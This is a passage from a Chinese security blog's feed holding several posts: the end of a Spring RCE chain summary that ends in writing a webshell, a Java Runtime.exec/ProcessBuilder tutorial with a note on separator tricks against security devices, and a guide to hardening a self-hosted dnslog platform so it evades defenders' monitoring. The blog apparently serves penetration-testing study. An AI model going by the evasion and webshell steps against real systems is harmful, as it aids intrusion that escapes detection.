阶段总结</h2><ol><li><p>该漏洞和spring在3月29号更新的反序列化漏洞没有关系，默认spring也没有导入org.springframework.cache ，这次更新修复的是2月19号的一个pr</p><img src="/img/Spring Framework RCE分析/image-20220403002119066.png" alt="image-20220403002119066" style="zoom:50%;" /></li><li><p>目前的利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spring beans中的参数绑定中存在一个<span class="class"><span class="keyword">class</span>属性</span></span><br><span class="line"><span class="class">  - 通过<span class="title">jdk9</span>的<span class="title">module</span>特性，即<span class="title">class</span>中存在<span class="title">module</span>属性，<span class="title">bypass</span> <span class="title">CVE</span>-2010-1622，调用到<span class="title">ClassLoader</span></span></span><br><span class="line"><span class="class">    - 通过操作<span class="title">org</span>.<span class="title">apache</span>.<span class="title">catalina</span>.<span class="title">valves</span>.<span class="title">AccessLogValve</span>，指定日志路径并触发日志写入的操作，传入了<span class="title">webshell</span></span></span><br></pre></td></tr></table></figure></li></ol><p>  整个分析过程中，其实感觉还有利用链可以挖掘，不管这个漏洞危害如何，感觉很有意思；</p><ul><li><p>同时也思考一个问题，挖个漏洞的时候该怎么思考？</p><p>我觉得首先应该有CVE-2010-1622和S2-020的分析经验吧，同时也了解过JDK9+的新特性，或者在调试老洞的时候误用了新的JDK</p></li><li><p>真牛</p></li><li><p>在spring框架调试中感到窒息</p></li></ul><hr><p>参考</p><p>Spring参数绑定：<a href="https://blog.csdn.net/AlbenXie/article/details/108548786">https://blog.csdn.net/AlbenXie/article/details/108548786</a></p>]]></content>
      
      
      <categories>
          
          <category> 攻防研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java命令执行浅析</title>
      <link href="/2021/09/03/Java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90/"/>
      <url>/2021/09/03/Java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>常用的两个类：<code>Runtime</code>、<code>ProcessBuilder</code></p><h2 id="Runtime类"><a href="#Runtime类" class="headerlink" title="Runtime类"></a>Runtime类</h2><blockquote><p><em>Every Java application has a single instance of class Runtime that allows the application to interface with the environment in which the application is running. The current runtime can be obtained from the getRuntime method.（每个Java应用程序都有一个Runtime类的Runtime ，允许应用程序与运行应用程序的环境进行接口。当前运行时可以从getRuntime方法获得。）</em></p></blockquote><ol><li><p>从<code>java.lang.Runtime</code>源码中看到，这个类自JDK1.0就存在了；该类的构造方法是私有的，目的为了不让”任何人”实例化这个类。如果需要得到Runtime类，可以使用静态方法<code>getRuntime()</code>，该方法返回值的是<code>Runtime</code>类型。</p><img src="/img/Java命令执行浅析/01.png" alt="01" style="zoom: 50%;" /></li><li><p>Runtime类中的方法</p><div  align="center">    <img src="/img/Java命令执行浅析/02.jpg" style="zoom: 50%;" /></div></li><li><p>这里重点关注一下<code>exec()</code>方法</p></li></ol><ul><li>Runtime中关于<code>exec()</code>共有6种重载的方法，返回值均为<code>Process</code>类型，也就有6种参数列表</li><li>其中主要有三个参数：command、envp、dir<ul><li><code>command (String/String[])</code>：需要执行的命令</li><li><code>envp (String[])</code>：运行环境的数组，该值为空表示子进程继承当前进程环境</li><li><code>dir (File)</code>：子进程的工作目录，该值为空表示继承当前进程的工作目录</li><li>这里主要区分在于传入的command的类型，分为字符串和字符串数组，envp和dir如果没有指定的话，默认为null</li></ul></li></ul><h3 id="字符串类型的参数"><a href="#字符串类型的参数" class="headerlink" title="字符串类型的参数"></a>字符串类型的参数</h3><ol><li>以调用exec打开计算器为例：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;);</span><br></pre></td></tr></table></figure><p>运行如上代码并调试，跟踪执行流程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec(String command)</span><br><span class="line">exec(String command, String[] envp, File dir)</span><br><span class="line">StringTokenizer(command)  <span class="comment">//获取StringTokenizer对象，将command转换为字符串数组</span></span><br><span class="line">exec(String[] command, String[] envp, File dir)</span><br><span class="line">ProcessBuilder(cmdarry).environment().directory().start()</span><br></pre></td></tr></table></figure><ol start="2"><li><p>整个流程会将String类型的命令  –&gt;  通过StringTokenizer处理为字符串数组  –&gt;  调用ProcessBuilder类进行实例化  –&gt;  调用ProcessBuilder的enviroment()、directory()、start()方法；ProcessBuilder的start()方法，返回的是Process对象。</p></li><li><p>实际上<code>Runtime</code>中执行系统命令的exec()方法最终仍然是对ProcessBuilder的调用。关于<code>ProcessBuilder</code>类的使用，先放到后面去分析。</p></li></ol><h3 id="StringTokenizer类"><a href="#StringTokenizer类" class="headerlink" title="StringTokenizer类"></a>StringTokenizer类</h3><ol><li>对于字符串类型的command，Runtime.exec()会通过StringTokenizer类中的方法，进一步分析command在这个过程中被怎样处理了。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//java.lang.Runtime.exec()</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String command, String[] envp, File dir)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (command.isEmpty())</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Empty command&quot;</span>);</span><br><span class="line"></span><br><span class="line">    StringTokenizer st = <span class="keyword">new</span> StringTokenizer(command);</span><br><span class="line">    String[] cmdarray = <span class="keyword">new</span> String[st.countTokens()];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; st.hasMoreTokens(); i++)</span><br><span class="line">        cmdarray[i] = st.nextToken();</span><br><span class="line">    <span class="keyword">return</span> exec(cmdarray, envp, dir);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>实例化StringTokenizer类  —&gt;  新建String[]类型的变量，长度为command分割后的个数  —&gt;  取分割后的每一段复制为cmdarray数组。        </li></ol><ul><li>实例化SkingTokenizer类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//java.util.StringTokenizer</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">StringTokenizer</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(str, <span class="string">&quot; \t\n\r\f&quot;</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">StringTokenizer</span><span class="params">(String str, String delim, <span class="keyword">boolean</span> returnDelims)</span> </span>&#123;</span><br><span class="line">    currentPosition = <span class="number">0</span>;</span><br><span class="line">    newPosition = -<span class="number">1</span>;</span><br><span class="line">    delimsChanged = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">this</span>.str = str;</span><br><span class="line">    maxPosition = str.length();</span><br><span class="line">    delimiters = delim;</span><br><span class="line">    retDelims = returnDelims;</span><br><span class="line">    setMaxDelimCodePoint();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如代码所示，分割为<code> \t\n\r\f</code> 分别对应 空格、制表符、换行符、回车符、换页符。</p><p>实例化的过程中，基本是对一些内部变量的赋值。</p><ul><li>StringTokenizer.countTokens()计算了command根据分割符会被分割的个数，hasMoreTokens()根据之前计算的分割总数和当前的分割次数判断是否继续循环取值，nextToken()则获取分割的内容，添加到cmdarray中。</li><li>分割的过程比较常规，但是回到经常遇到的一个问题：在Runtime.getRuntime.exec()中不能使用某些特殊字符，如 | &amp; ，这是为什么呢？</li></ul><h3 id="调试分析带有特殊字符的命令"><a href="#调试分析带有特殊字符的命令" class="headerlink" title="调试分析带有特殊字符的命令"></a>调试分析带有特殊字符的命令</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;echo hello &gt; /tmp/success.txt);</span></span><br></pre></td></tr></table></figure><p>下断点进入调试</p><p><img src="/img/Java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90/03.png" alt="03"></p><p>如图所示，命令被分割为<code>new String[]&#123;&quot;echo&quot;, &quot;hello&quot;, &quot;&gt;&quot;, &quot;/tmp/success.txt&quot;&#125; </code>，相当于我们运行如下代码，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;echo&quot;</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;&gt;&quot;</span> , <span class="string">&quot;/tmp/success.txt&quot;</span>&#125;);</span><br><span class="line"><span class="comment">// -&gt; 相当于</span></span><br><span class="line"><span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;echo&quot;</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;&gt;&quot;</span> , <span class="string">&quot;/tmp/success.txt&quot;</span>&#125;).start();</span><br></pre></td></tr></table></figure><p>看来不是分割字符的问题，实际上执行上面的代码也是不成功的，当然解决方法是使用如下代码执行，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo hello &gt; /tmp/success.txt&quot;</span>&#125;)</span><br></pre></td></tr></table></figure><p>但是为什么重定符加入后，运行命令失败呢？看来问题在<code>ProcessBuilder</code>这个类的方法中。</p><h2 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h2><blockquote><p>This class is used to create operating system processes.（这个类用于创建操作系统进程）</p></blockquote><ol><li><p>该类共有两个构造方法，很好理解，分别是String…和List<String>类型的参数列表。传入的command最终均赋值给command变量。</p><p>这里有个有意思的地方，实际上ProcessBuilder自JDK1.5中才有的。那是不是JDK1.5以前Runtime类中没有exec方法呢？或者当时1.5以前的exec()方法，还是有别的运行逻辑 :&gt;</p><img src="/img/Java命令执行浅析/04.png" alt="04" style="zoom:50%;" /></li><li><p><code>ProcessBuilder</code>类中的方法</p></li></ol><img src="/img/Java命令执行浅析/05.png" alt="05" style="zoom:50%;" /><p>首先测试一个常规执行命令的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo hello &gt; /tmp/success.txt&quot;</span>).start();</span><br></pre></td></tr></table></figure><h3 id="获取命令执行的返回结果"><a href="#获取命令执行的返回结果" class="headerlink" title="获取命令执行的返回结果"></a>获取命令执行的返回结果</h3><p>总结了四种获取命令执行的数据流</p><ul><li><strong>执行命令</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder p = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;ifconfig&quot;</span>);</span><br><span class="line">System.out.println(p.command());</span><br><span class="line">Process process = p.start();</span><br></pre></td></tr></table></figure><ul><li>获取返回结果 - 1</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream()));</span><br><span class="line">String line = <span class="keyword">null</span>;</span><br><span class="line">StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">    sb.append(line + System.getProperty(<span class="string">&quot;line.separator&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>读取返回结果 - 2</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Scanner s = <span class="keyword">new</span> Scanner(process.getInputStream());</span><br><span class="line">String result = s.useDelimiter(<span class="string">&quot;\\A&quot;</span>).hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">System.out.println(result);</span><br></pre></td></tr></table></figure><ul><li>读取返回结果 - 3</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String result = org.apache.commons.io.IOUtils.toString(process.getInputStream());</span><br><span class="line">System.out.println(result);</span><br></pre></td></tr></table></figure><ul><li>读取返回结果 - 4</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//JDK8+</span></span><br><span class="line">BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream()));</span><br><span class="line">StringJoiner stringJoiner = <span class="keyword">new</span> StringJoiner(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">reader.lines().iterator().forEachRemaining(stringJoiner::add);</span><br><span class="line">System.out.println(stringJoiner.toString());</span><br></pre></td></tr></table></figure><h3 id="不能直接获取返回结果的命令"><a href="#不能直接获取返回结果的命令" class="headerlink" title="不能直接获取返回结果的命令"></a>不能直接获取返回结果的命令</h3><p>实际上，当我们执行<code>python —version</code>, <code>java -version</code> 这一类非系统命令，而通过运行环境的环境变量中添加的命令时，默认是无法通过 <code>getInputStream()</code>获取数据流的。</p><p>比如如下运行结果，是获取不到结果的。</p><img src="/img/Java命令执行浅析/06.png" alt="06" style="zoom:50%;" /><p>这里可以调用<code>ProcessBuilder.inheritIO()</code>和<code>ProcessBuilder.redirectErrorStream()</code>这两个方法让你看到执行的结果，不过这两个方法也是有区别的。</p><ul><li><p><strong><u>ProcessBuilder.inheritIO()</u></strong></p><blockquote><p>Sets the source and destination for subprocess standard I/O to be the same as those of the current Java process.(将子进程标准I/O的源和目标设置为与当前Java进程的源和目标相同。)</p></blockquote><p>这个方法实际上将子进程运行的结果输出在当前Java进程的输出显示，比如</p><img src="/img/Java命令执行浅析/07.png" alt="07" style="zoom: 50%;" /></li></ul><p>​    如上图所示，实际上并没有通过<code>getInputsStream()</code>取返回结果，但是控制台输出了打印结果。可以看到<code>java -version</code>的结果是<em>红色</em>的，这通常表示是一个异常信息的打印。</p><ul><li><p><strong><u>ProcessBuilder.redirectErrorStream(true)</u></strong></p><blockquote><p>Sets this process builder’s redirectErrorStream property. If this property is true, then any error output generated by subprocesses subsequently started by this object’s start() method will be merged with the standard output, so that both can be read using the Process.getInputStream() method. This makes it easier to correlate error messages with the corresponding output. The initial value is false.</p></blockquote><p>大概的意思是，如果调用该方法且参数为<strong>true</strong> ，<code>start()</code>方法启动的子进程生成的任何错误输出都将与标准输出合并，以便可以使用<code>Process.getInputStream()</code>方法获取结果。</p><img src="/img/Java命令执行浅析/08.png" alt="08" style="zoom: 50%;" /></li></ul><p>那么为什么<code>java -version</code>返回的结果被当做异常信息了呢？调试跟踪看一下是如何运行的。</p><p>跟踪一下运行流程，发现系统的异常打印从<code>forkAndExec()</code>这个方法后出现的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder.start()</span><br><span class="line">ProcessImpl.start(...)</span><br><span class="line"><span class="keyword">new</span> UNIXProcess(...)</span><br><span class="line">pid = forkAndExec(...)</span><br></pre></td></tr></table></figure><img src="/img/Java命令执行浅析/09.png" alt="09" style="zoom: 50%;" /><p>这里<code>forkAndExec()</code> 的修复符是<code>native</code> ，相当于实际上运行<code>forkAndExec</code>时会调用C语言实现相应的功能。对应的源码可参照<code>openjdk8/openjdk/jdk/src/solaris/native/java/lang/UNIXProcess_md.c</code> 来阅读。</p><p>总结一下这部分的实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder p = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-version&quot;</span>);</span><br><span class="line">p.redirectErrorStream(<span class="keyword">true</span>);</span><br><span class="line">Process process = p.start();</span><br><span class="line">BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream()));</span><br><span class="line">String line = <span class="keyword">null</span>;</span><br><span class="line">StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">    sb.append(line + System.getProperty(<span class="string">&quot;line.separator&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">process.waitFor();</span><br><span class="line">System.out.println(sb.toString());</span><br></pre></td></tr></table></figure><p>补充一下：<code>Process.waitFor()</code>会将当前线程阻塞，直到子进程执行退出</p><h3 id="特殊符号的问题"><a href="#特殊符号的问题" class="headerlink" title="特殊符号的问题"></a>特殊符号的问题</h3><p>回到<code>Runtime.getRuntime().exec()</code>中的问题，为什么带有重定符、管道符等特殊符号的命令不能直接执行呢？</p><p>先执行一下带有重定向符的命令：</p><img src="/img/Java命令执行浅析/10.png" alt="10" style="zoom: 50%;" /><p>返回结果初步判断是将<code>&quot;1&quot; &quot;&gt;&quot; &quot;/tmp/success&quot;</code>作为<code>echo</code>命令的参数来执行了，相当于执行<code>echo 1 &quot;&gt;&quot; /tmp/success</code> 这样的命令</p><img src="/img/Java命令执行浅析/11.png" alt="11" style="zoom:50%;" /><p>继续调试一下</p><img src="/img/Java命令执行浅析/12.png" alt="12" style="zoom: 50%;" /><img src="/img/Java命令执行浅析/13.png" alt="13" style="zoom: 50%;" /><p>在实例化<strong>UNIXProcess</strong>对象后执行子进程时，字节数组第一位是待执行的命令，其他的都作为参数处理，而我理解的<em>命令行</em>中执行的管道符是由于<em>bash</em>或<em>命令提示符</em> 会对管道符、重定向符等特殊符号赋予特殊的含义吧。方法的话可以使用<code>new String[]&#123;&quot;bash&quot;,&quot;-c&quot;,&quot;&quot;&#125;</code>来避免这些符号带来的困扰。</p><h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><ol><li><p>根据StringTokenizer类中方法，在命令中加入一些不同的分割符能不能绕过一些安全设备的防护呢？估计效果不太好。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;open\t\f\f\t\f\f\f/System/Applications/Calculator.app&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>JDK1.5以前没有ProcessBuilder类。</p></li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><em><a href="https://download.java.net/openjdk/jdk8">https://download.java.net/openjdk/jdk8</a></em></p><p><em><a href="https://www.oracle.com/java/technologies/java-archive-142docs-downloads.html">https://www.oracle.com/java/technologies/java-archive-142docs-downloads.html</a></em></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dnslog平台探索</title>
      <link href="/2021/05/06/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/"/>
      <url>/2021/05/06/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/</url>
      
        <content type="html"><![CDATA[<p>&emsp;&emsp;在蓝军防守过程中，遇到一些告警的流量中，出现很明显的dnslog平台的痕迹，比如：验证fastjson时，payload时xxx.dnslog.cn，这种流量会直接触发反序列化攻击的攻击，那么对于这个攻击的防护算检测到了，但是如果使用一些编码绕过了流量的识别呢？实际上越来越多的安全监控将dnslog.cn、ceye.io加入到针对dns流量的分析中；一次真实的溯源工作中，我们通过ceye.io的id找到了真实的攻击者，这表示公用的dnslog平台已经不能用来做更加隐蔽攻击探测。<br>&emsp;&emsp;实际上很多的团队已经自己搭建dnslog平台，或将dnlog功能加入到自建的安全攻击平台中。</p><p>一个简单、实用、安全的dnslog平台有哪些需求呢？</p><ul><li>方便启动</li><li>账号分权</li><li>管理端的安全性</li><li>域名更隐蔽<br>…</li></ul><h3 id="选取一套合适的开源代码"><a href="#选取一套合适的开源代码" class="headerlink" title="选取一套合适的开源代码"></a>选取一套合适的开源代码</h3><p>&emsp;&emsp;有精力的话，可以自己从开始编写代码，但是这样有点耗费时间，github上已经有很多开源的项目，这里挑出来3个。</p><blockquote><p>java版本：<br><a href="https://github.com/SPuerBRead/Bridge">https://github.com/SPuerBRead/Bridge</a><br>python版本：<br><a href="https://github.com/BugScanTeam/DNSLog">https://github.com/BugScanTeam/DNSLog</a><br>golang版本：<br><a href="https://github.com/chennqqi/godnslog">https://github.com/chennqqi/godnslog</a><br>我选择了SPuerBRead的Bridge，功能介绍可以参考该项目的readme。</p></blockquote><h3 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h3><p>&emsp;&emsp;SPuerBRead的这台平台已经可以做到很方便的启动、dnslog、httplog的记录功能了，但是对于自己使用起来，还有一些小需求，于是做了一些的修改。<br>如下是一些想法和作出的改动</p><h5 id="Q1：启动后登录，注册的用户会生成logid字段，该字段是数字类型，值是1、2、3、4-。。。，这样导致用户的dnslog验证的payload地址是这样的："><a href="#Q1：启动后登录，注册的用户会生成logid字段，该字段是数字类型，值是1、2、3、4-。。。，这样导致用户的dnslog验证的payload地址是这样的：" class="headerlink" title="Q1：启动后登录，注册的用户会生成logid字段，该字段是数字类型，值是1、2、3、4 。。。，这样导致用户的dnslog验证的payload地址是这样的："></a>Q1：启动后登录，注册的用户会生成logid字段，该字段是数字类型，值是1、2、3、4 。。。，这样导致用户的dnslog验证的payload地址是这样的：</h5><p>xxx.1.dnslog.com<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E4%BF%AE%E6%94%B9%E5%89%8D.jpg" alt="修改前"><br>这样对于监控来说，很可能会觉得如果有内网解析这样的dns请求是很奇怪的。<br><strong>A：</strong>修改了用户logid字段类型为varchar类型，在注册用户是生成为随机的4位字符。<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E4%BF%AE%E6%94%B9%E5%90%8E.jpg" alt="修改后"></p><h5 id="Q2：原程序中任何子域的解析请求都会响应并记录到数据库中，这样一旦遇到爆破dns记录的情况，会导致数据库中大量垃圾数据。"><a href="#Q2：原程序中任何子域的解析请求都会响应并记录到数据库中，这样一旦遇到爆破dns记录的情况，会导致数据库中大量垃圾数据。" class="headerlink" title="Q2：原程序中任何子域的解析请求都会响应并记录到数据库中，这样一旦遇到爆破dns记录的情况，会导致数据库中大量垃圾数据。"></a>Q2：原程序中任何子域的解析请求都会响应并记录到数据库中，这样一旦遇到爆破dns记录的情况，会导致数据库中大量垃圾数据。</h5><p>A2：在返回解析结果时检查库中是否有request对应logid，如果不存在则不响应任何内容</p><h5 id="Q3：对web访问做限制，只有自己或小伙伴可以访问管理端。"><a href="#Q3：对web访问做限制，只有自己或小伙伴可以访问管理端。" class="headerlink" title="Q3：对web访问做限制，只有自己或小伙伴可以访问管理端。"></a>Q3：对web访问做限制，只有自己或小伙伴可以访问管理端。</h5><p>A2：自定义header字段的判断，只放过自定义header验证正确的请求，有关Header-Signal的值，可以指定springboot启动参数位置自定义。<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E8%87%AA%E5%AE%9A%E4%B9%89header%E6%AD%A3%E7%A1%AE%E7%9A%84%E8%AF%B7%E6%B1%82.jpg" alt="自定义header正确的请求"></p><p><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E8%87%AA%E5%AE%9A%E4%B9%89header%E9%94%99%E8%AF%AF%E7%9A%84%E8%AF%B7%E6%B1%82.jpg" alt="自定义header错误的请求"></p><p>其他也更新了一些小功能，比如logid的显示，dnslog界面显示payload等。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>启动参数可以参考帮助信息或项目readme</p><blockquote><p>这里有一个有意思的地方：在网上看过几片文章，有些写着需要两个域名来实现自定义解析的功能，这里试验了一下，其实使用一个域名服务就可以实现。</p></blockquote><p>首先我们看下两个域名的一个解析流程<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E4%B8%A4%E4%B8%AA%E5%9F%9F%E5%90%8D%E7%9A%84%E9%85%8D%E7%BD%AE.jpg" alt="两个域名的解析流程"></p><p>实际上，一个域名也可以配置<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/dns%E9%85%8D%E7%BD%AE%E6%88%AA%E5%9B%BE.jpg" alt="-w1001"></p><p>这样的解析过程就可以依靠一个域名、一个vps完成。<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E4%B8%80%E4%B8%AA%E5%9F%9F%E5%90%8D%E7%9A%84%E9%85%8D%E7%BD%AE.jpg" alt="一个域名的解析过程"><br>从dns解析的trace也可以清晰的看到解析路径。<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/dnsTrace.jpg" alt="dnstrace"><br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/16206419670337.jpg" alt="-w1144"></p><p>搭建完了才发现，原作者也是一个域名。。。</p><h3 id="end"><a href="#end" class="headerlink" title="end"></a>end</h3><p>&emsp;&emsp;还有一个小思路，现在很多dnslog平台，在返回解析记录时，将所有解析记录都指向127.0.0.1，对于安全监控来说，完全可以在针对dns流量的审计中，增加判断，当检测到存在127.0.0.1的response返回包时，触发告警疑似dnslog请求。所以在搭建的时候，配置平台默认返回的解析结果尽量指定一个可信的公网ip。</p><blockquote><p>项目源代码上传至：<a href="https://github.com/ninefiger/dnslogPt">https://github.com/ninefiger/dnslogPt</a><br>感谢原版作者：<a href="https://github.com/SPuerBRead/Bridge">https://github.com/SPuerBRead/Bridge</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 攻防研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win10—SMB3_CVE-2020-0796复现</title>
      <link href="/2020/11/22/win10%E2%80%94SMB3-CVE-2020-0796%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/11/22/win10%E2%80%94SMB3-CVE-2020-0796%E5%A4%8D%E7%8E%B0/</url>
      
